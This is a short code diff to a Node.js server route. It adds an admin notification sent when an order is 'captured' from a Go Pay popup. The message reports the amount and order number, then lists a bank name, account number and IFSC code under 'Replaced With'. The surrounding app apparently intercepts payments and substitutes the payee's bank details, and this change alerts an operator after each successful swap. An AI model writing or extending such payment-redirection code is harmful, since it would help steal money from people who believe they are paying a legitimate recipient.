@@ -1847,9 +1847,14 @@ app.all('/xxapi/*', async (req, res) => {
                   time: now,
                   userId: String(userId || ''),
                   forced: true,
-                  isManual: true
+                  isManual: true,
+                  notified: true // Set to true so we don't double notify later
                 };
                 saveData(data).catch(()=>{});
+                
+                // Notify admin that the order was captured from the Go Pay popup
+                notifyAdmin(data,
+                  `✅ BUY SUCCESSFUL (Go Pay)\n💰 Amount: ₹${amt}\n📋 Order: ${rptNo}\n💾 Order is saved for history\n━━━━━━━━━━━━━━━━━━━━\n🏦 Bank Was: (Popup Captured)\n━━━━━━━━━━━━━━━━━━━━\n🔄 Replaced With: ${bkName} | ${bkAcct} | ${bkIfsc}\n🕐 ${now}`);
               }
             }
           }
